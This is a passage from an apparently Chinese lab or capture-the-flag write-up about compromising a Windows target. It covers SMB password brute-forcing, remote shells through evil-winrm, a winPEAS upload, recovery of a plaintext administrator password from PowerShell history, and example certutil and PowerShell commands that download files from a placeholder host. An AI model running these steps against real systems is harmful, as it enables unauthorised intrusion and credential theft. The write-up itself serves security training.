class="string">&#x27;&#x27;</span>.  Aborting remainder of tests.                                                                                                                                              </span><br><span class="line">                                                                                                        </span><br></pre></td></tr></table></figure>
+<p>没看到有价值的信息……</p>
+<h2 id="web-信息收集">4. Web 信息收集</h2>
+<p>80 扫目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://10.0.3.33/&quot;</span>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,asp,config,aspx,txt -f -t 50 2&gt;&amp;/dev/null</span><br></pre></td></tr></table></figure>
+<p>得 tasks.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># curl http://10.0.3.33/tasks.txt </span></span><br><span class="line">Pending tasks:</span><br><span class="line"></span><br><span class="line"> - Finish website</span><br><span class="line"> - Update OS</span><br><span class="line"> - Drink coffee</span><br><span class="line"> - Rest</span><br><span class="line"> - Change password</span><br><span class="line"></span><br><span class="line">By hope        </span><br></pre></td></tr></table></figure>
+<p>得用户名 hope</p>
+<h2 id="smb-爆破">5. SMB 爆破</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.0.3.33 -u hope  -p rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412161651895.jpg" /></p>
+<p>得 hope:loser，SMB 认证没问题，但没权限访问工作文件夹（注，IP
+不一样是靶机出问题后重新导入了）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># smbclient //10.0.3.38/ADMIN$ -U hope                                  </span></span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\hope]:</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># smbclient //10.0.3.38/ADMIN$ -U hope -d 3</span></span><br><span class="line">lp_load_ex: refreshing parameters</span><br><span class="line">Initialising global parameters</span><br><span class="line">rlimit_max: increasing rlimit_max (1024) to minimum Windows <span class="built_in">limit</span> (16384)</span><br><span class="line">Processing section <span class="string">&quot;[global]&quot;</span></span><br><span class="line">added interface eth1 ip=fd17:625c:f037:3:da07:94a6:25e7:73d7 bcast= netmask=ffff:ffff:ffff:ffff::</span><br><span class="line">added interface eth1 ip=10.0.3.28 bcast=10.0.3.255 netmask=255.255.255.0</span><br><span class="line">added interface docker0 ip=172.17.0.1 bcast=172.17.255.255 netmask=255.255.0.0</span><br><span class="line">added interface br-cb40906d2f3b ip=172.18.0.1 bcast=172.18.255.255 netmask=255.255.0.0</span><br><span class="line">added interface br-731bef90865e ip=172.19.0.1 bcast=172.19.255.255 netmask=255.255.0.0</span><br><span class="line">added interface br-6434a39ea5a2 ip=172.20.0.1 bcast=172.20.255.255 netmask=255.255.0.0</span><br><span class="line">added interface br-98204e7d9fe0 ip=172.21.0.1 bcast=172.21.255.255 netmask=255.255.0.0</span><br><span class="line">added interface eth0 ip=192.168.1.192 bcast=192.168.1.255 netmask=255.255.255.0</span><br><span class="line">Client started (version 4.21.0-Kali-4.21.0+dfsg-1kali1).</span><br><span class="line">Connecting to 10.0.3.38 at port 445</span><br><span class="line">GENSEC backend <span class="string">&#x27;gssapi_spnego&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;gssapi_krb5&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;gssapi_krb5_sasl&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;spnego&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;schannel&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;ncalrpc_as_system&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;sasl-EXTERNAL&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;ntlmssp&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;ntlmssp_resume_ccache&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;http_basic&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;http_ntlm&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;http_negotiate&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;krb5&#x27;</span> registered</span><br><span class="line">GENSEC backend <span class="string">&#x27;fake_gssapi_krb5&#x27;</span> registered</span><br><span class="line">gensec_gse_client_start: Not using kerberos to cifs/10.0.3.38 as WORKGROUP\hope: NT_STATUS_INVALID_PARAMETER</span><br><span class="line">Got challenge flags:</span><br><span class="line">Got NTLMSSP neg_flags=0x628a8215</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\hope]:</span><br><span class="line">NTLMSSP: Set final flags:</span><br><span class="line">Got NTLMSSP neg_flags=0x62088215</span><br><span class="line">NTLMSSP Sign/Seal - Initialising with flags:</span><br><span class="line">Got NTLMSSP neg_flags=0x62088215</span><br><span class="line">NTLMSSP Sign/Seal - Initialising with flags:</span><br><span class="line">Got NTLMSSP neg_flags=0x62088215</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>
+<h2 id="winrm-远程管理">6. WinRM 远程管理</h2>
+<p>WinRM 基本介绍</p>
+<blockquote>
+<p><a
+target="_blank" rel="noopener" href="https://book.hacktricks.xyz/cn/network-services-pentesting/5985-5986-pentesting-winrm">5985,5986
+- Pentesting WinRM | HackTricks</a><br />
+<a
+target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx">Windows
+远程管理 (WinRM)</a> 被微软强调为一种 <strong>协议</strong>，它通过
+HTTP(S) 实现 <strong>Windows 系统的远程管理</strong>，并在此过程中利用
+SOAP。它基本上由 WMI 提供支持，呈现为 WMI 操作的基于 HTTP 的接口。<br />
+简言之，WinRM 在机器上的存在允许通过 PowerShell
+进行简单的远程管理，类似于 SSH 在其他操作系统中的工作方式。要确定 WinRM
+是否正常运行，建议检查特定端口的开放情况：</p>
+<ul>
+<li>5985/tcp (HTTP)<br />
+</li>
+<li>5986/tcp (HTTPS)</li>
+</ul>
+<p>上述列表中的开放端口表示 WinRM
+已被设置，从而允许尝试启动远程会话。</p>
+</blockquote>
+<p>Linux 下的利用工具</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.kali.org/tools/evil-winrm/">Evil-Winrm | Kali
+Linux Tools</a><br />
+Windows远程管理（WinRM，Windows Remote Management）是 WS 管理协议的
+Microsoft 实施，该协议是基于标准
+SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。而微软将其包含在他们的系统中，是为了便于系统管理员在日常工作中，远程管理服务器，或通过脚本同时管理多台服务器，以提高他们的工作效率。<br />
+该程序（工具）可以在任何启用了此功能的 Microsoft Windows Server
+上使用（通常在端口
+5985），当然，前提是您拥有使用它的凭据和权限。因此，它可以用于漏洞利用后的黑客攻击/渗透测试阶段。该程序的目的是为黑客攻击提供良好且易于使用的功能。系统管理员也可以将其用于合法目的，但其大部分功能都集中在黑客攻击/渗透测试上。</p>
+</blockquote>
+<p>经测 Evil-WinRM 利用前面爆破得到的 <code>hope:loser</code> 可成功连接
+WinRM 并获得 Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># evil-winrm -i 10.0.3.38 -u &#x27;hope&#x27; -p &#x27;loser&#x27;                         </span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\hope\Documents&gt; <span class="built_in">whoami</span> /all</span><br><span class="line"></span><br><span class="line">INFORMACIàN DE USUARIO</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Nombre de usuario SID</span><br><span class="line">================= =============================================</span><br><span class="line">admin\hope        S-1-5-21-3084561998-2733067770-554905821-1001</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACIàN DE GRUPO</span><br><span class="line">--------------------</span><br><span class="line"></span><br><span class="line">Nombre de grupo                              Tipo           SID          Atributos</span><br><span class="line">============================================ ============== ============ ========================================================================</span><br><span class="line">Todos                                        Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">BUILTIN\Usuarios                             Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">BUILTIN\Usuarios de administraci¢n remota    Alias          S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\NETWORK                         Grupo conocido S-1-5-2      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Esta compa¤¡a                   Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Cuenta <span class="built_in">local</span>                    Grupo conocido S-1-5-113    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Autenticaci¢n NTLM              Grupo conocido S-1-5-64-10  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACIàN DE PRIVILEGIOS</span><br><span class="line">--------------------------</span><br><span class="line"></span><br><span class="line">Nombre de privilegio          Descripci¢n                                  Estado</span><br><span class="line">============================= ============================================ ==========</span><br><span class="line">SeShutdownPrivilege           Apagar el sistema                            Habilitada</span><br><span class="line">SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada</span><br><span class="line">SeUndockPrivilege             Quitar equipo de la estaci¢n de acoplamiento Habilitada</span><br><span class="line">SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada</span><br><span class="line">SeTimeZonePrivilege           Cambiar la zona horaria                      Habilitada</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\hope\Documents&gt; <span class="built_in">cd</span> ../</span><br><span class="line">*Evil-WinRM* PS C:\Users\hope&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directorio: C:\Users\hope</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-r---          7/3/2024   8:04 PM                3D Objects</span><br><span class="line">d-r---          7/3/2024   8:04 PM                Contacts</span><br><span class="line">d-r---          7/3/2024   9:42 PM                Desktop</span><br><span class="line">d-r---          7/3/2024   8:04 PM                Documents</span><br><span class="line">d-r---          7/3/2024   8:04 PM                Downloads</span><br><span class="line">d-r---          7/3/2024   8:04 PM                Favorites</span><br><span class="line">d-r---          7/3/2024   8:04 PM                Links</span><br><span class="line">d-r---          7/3/2024   8:04 PM                Music</span><br><span class="line">d-r---          7/3/2024   8:06 PM                OneDrive</span><br><span class="line">d-r---          7/3/2024   8:06 PM                Pictures</span><br><span class="line">d-r---          7/3/2024   8:04 PM                Saved Games</span><br><span class="line">d-r---          7/3/2024   8:05 PM                Searches</span><br><span class="line">d-r---          7/3/2024   8:16 PM                Videos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\hope&gt; <span class="built_in">cd</span> Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\hope\Desktop&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directorio: C:\Users\hope\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----          7/3/2024   9:42 PM             70 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\hope\Desktop&gt; <span class="built_in">type</span> user.txt</span><br><span class="line">aacd…………</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得 user.txt</p>
+<h2 id="提权">7. 提权</h2>
+<p>上传 winPEAS.exe 扫描可能的提权信息</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng">GitHub -
+peass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE
+(with colors)</a></p>
+</blockquote>
+<p>注，直接用下面方法传，用 certutil 下载的话会被 AV 拦截</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\hope&gt; upload /root/Desktop/winPEASx64.exe</span><br><span class="line">                                        </span><br><span class="line">Info: Uploading /root/Desktop/winPEASx64.exe to C:\Users\hope\winPEASx64.exe</span><br><span class="line">                                        </span><br><span class="line">Data: 13122900 bytes of 13122900 bytes copied</span><br><span class="line">                                        </span><br><span class="line">Info: Upload successful!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Windows 命令行下载远程文件示例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://xx.xx.xx.xx/test.zip c:\test.zip  （windows远程下载文件至本地，仅需要一个cmd执行的地方）</span><br><span class="line">curl http://xx.xx.xx.xx/test.zip -o c:\test.zip</span><br><span class="line">powershell -c <span class="string">&quot;invoke-webrequest -uri http://xx.xx.xx.xx/test.zip -outfile test.zip&quot;</span></span><br></pre></td></tr></table></figure>
+<p>执行 winPEASx64.exe 得</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412161731116.jpg" /></p>
+<p>进一步查询得 administrator 用户密码 SuperAdministrator123</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\hope&gt; <span class="built_in">type</span> C:\Users\hope\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><br><span class="line">Set-LocalUser -Name <span class="string">&quot;administrator&quot;</span> -Password (ConvertTo-SecureString <span class="string">&quot;SuperAdministrator123&quot;</span> -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
+<p>Evil-WinRM 登录 administrator</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># evil-winrm -i 10.0.3.38 -u &#x27;administrator&#x27; -p &#x27;SuperAdministrator123&#x27;</span></span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\administrator\Documents&gt; <span class="built_in">whoami</span> /all</span><br><span class="line"></span><br><span class="line">INFORMACIàN DE USUARIO</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Nombre de usuario   SID</span><br><span class="line">=================== =============================================</span><br><span class="line">admin\administrator S-1-5-21-3084561998-2733067770-554905821-1002</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACIàN DE GRUPO</span><br><span class="line">--------------------</span><br><span class="line"></span><br><span class="line">Nombre de grupo                                                  Tipo           SID          Atributos</span><br><span class="line">================================================================ ============== ============ ==============================================================================================</span><br><span class="line">Todos                                                            Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Cuenta <span class="built_in">local</span> y miembro del grupo de administradores Grupo conocido S-1-5-114    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">BUILTIN\Administradores                                          Alias          S-1-5-32-544 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado, Propietario de grupo</span><br><span class="line">BUILTIN\Usuarios                                                 Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\NETWORK                                             Grupo conocido S-1-5-2      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Usuarios autentificados                             Grupo conocido S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Esta compa¤¡a                                       Grupo conocido S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Cuenta <span class="built_in">local</span>                                        Grupo conocido S-1-5-113    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">NT AUTHORITY\Autenticaci¢n NTLM                                  Grupo conocido S-1-5-64-10  Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span><br><span class="line">Etiqueta obligatoria\Nivel obligatorio alto                      Etiqueta       S-1-16-12288</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INFORMACIàN DE PRIVILEGIOS</span><br><span class="line">--------------------------</span><br><span class="line"></span><br><span class="line">Nombre de privilegio                      Descripci¢n                                                         Estado</span><br><span class="line">========================================= =================================================================== ==========</span><br><span class="line">SeIncreaseQuotaPrivilege                  Ajustar las cuotas de la memoria para un proceso                    Habilitada</span><br><span class="line">SeSecurityPrivilege                       Administrar registro de seguridad y auditor¡a                       Habilitada</span><br><span class="line">SeTakeOwnershipPrivilege                  Tomar posesi¢n de archivos y otros objetos                          Habilitada</span><br><span class="line">SeLoadDriverPrivilege                     Cargar y descargar controladores de dispositivo                     Habilitada</span><br><span class="line">SeSystemProfilePrivilege                  Generar perfiles del rendimiento del sistema                        Habilitada</span><br><span class="line">SeSystemtimePrivilege                     Cambiar la hora del sistema                                         Habilitada</span><br><span class="line">SeProfileSingleProcessPrivilege           Generar perfiles de un solo proceso                                 Habilitada</span><br><span class="line">SeIncreaseBasePriorityPrivilege           Aumentar prioridad de programaci¢n                                  Habilitada</span><br><span class="line">SeCreatePagefilePrivilege                 Crear un archivo de paginaci¢n                                      Habilitada</span><br><span class="line">SeBackupPrivilege                         Hacer copias de seguridad de archivos y directorios                 Habilitada</span><br><span class="line">SeRestorePrivilege                        Restaurar archivos y directorios                                    Habilitada</span><br><span class="line">SeShutdownPrivilege                       Apagar el sistema                                                   Habilitada</span><br><span class="line">SeDebugPrivilege                          Depurar programas                                                   Habilitada</span><br><span class="line">SeSystemEnvironmentPrivilege              Modificar valores de entorno firmware                               Habilitada</span><br><span class="line">SeChangeNotifyPrivilege                   Omitir comprobaci¢n de recorrido                                    Habilitada</span><br><span class="line">SeRemoteShutdownPrivilege                 Forzar cierre desde un sistema remoto                               Habilitada</span><br><span class="line">SeUndockPrivilege                         Quitar equipo de la estaci¢n de acoplamiento                        Habilitada</span><br><span class="line">SeManageVolumePrivilege                   Realizar tareas de mantenimiento del volumen                        Habilitada</span><br><span class="line">SeImpersonatePrivilege                    Suplantar a un cliente tras la autenticaci¢n                        Habilitada</span><br><span class="line">SeCreateGlobalPrivilege                   Crear objetos globales                                              Habilitada</span><br><span class="line">SeIncreaseWorkingSetPrivilege             Aumentar el espacio de trabajo de un proceso                        Habilitada</span><br><span class="line">SeTimeZonePrivilege                       Cambiar la zona horaria                                             Habilitada</span><br><span class="line">SeCreateSymbolicLinkPrivilege             Crear v¡nculos simb¢licos                                           Habilitada</span><br><span class="line">SeDelegateSessionUserImpersonatePrivilege Obt‚n un token de suplantaci¢n para otro usuario en la misma sesi¢n Habilitada</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\administrator\Documents&gt; <span class="built_in">cd</span> ~</span><br><span class="line">*Evil-WinRM* PS C:\Users\administrator&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\administrator&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directorio: C:\Users\administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-r---          7/3/2024   9:15 PM                3D Objects</span><br><span class="line">d-r---          7/3/2024   9:15 PM                Contacts</span><br><span class="line">d-r---          7/3/2024   9:49 PM                Desktop</span><br><span class="line">d-r---          7/3/2024   9:15 PM                Documents</span><br><span class="line">d-r---          7/3/2024   9:15 PM                Downloads</span><br><span class="line">d-r---          7/3/2024   9:15 PM                Favorites</span><br><span class="line">d-r---          7/3/2024   9:15 PM                Links</span><br><span class="line">d-r---          7/3/2024   9:15 PM                Music</span><br><span class="line">d-r---          7/3/2024   9:17 PM                Pictures</span><br><span class="line">d-r---          7/3/2024   9:15 PM                Saved Games</span><br><span class="line">d-r---          7/3/2024   9:17 PM                Searches</span><br><span class="line">d-r---          7/3/2024   9:15 PM                Videos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\administrator&gt; <span class="built_in">cd</span> Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\administrator\Desktop&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directorio: C:\Users\administrator\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----          7/3/2024   9:43 PM             70 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\administrator\Desktop&gt; <span class="built_in">type</span> root.txt</span><br><span class="line">fe58………………</span><br><span class="line">*Evil-WinRM* PS C:\Users\administrator\Desktop&gt; </span><br></pre></td></tr></table></figure>
+<p>获得管理员权限</p>
+<h2 id="提权补充">8. 提权补充</h2>
+<p>如果 Evil-WinRM 登录不了管理员用户，可以尝试利用 hope 用户的 Shell
+弹个 administrator 用户的 Shell</p>
+<p>利用 RunasCs【<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs">GitHub
+- antonioCoco/RunasCs: RunasCs - Csharp and open version of windows
+builtin runas.exe</a>】进一步提权的</p>
+<blockquote>
+<p><em>RunasCs</em> is an utility to run specific processes with
+different permissions than the user's current logon provides using
+explicit credentials. This tool is an improved and open version of
+windows builtin <em>runas.exe</em> that solves some limitations:</p>
+<ul>
+<li>Allows explicit credentials</li>
+<li>Works both if spawned from interactive process and from service
+process</li>
+<li>Manage properly <em>DACL</em> for <em>Window
+Stations</em> and <em>Desktop</em> for the creation of the new
+process</li>
+<li>Uses more reliable create process functions
+like <code>CreateProcessAsUser()</code> and <code>CreateProcessWithTokenW()</code> if
+the calling process holds the required privileges (automatic
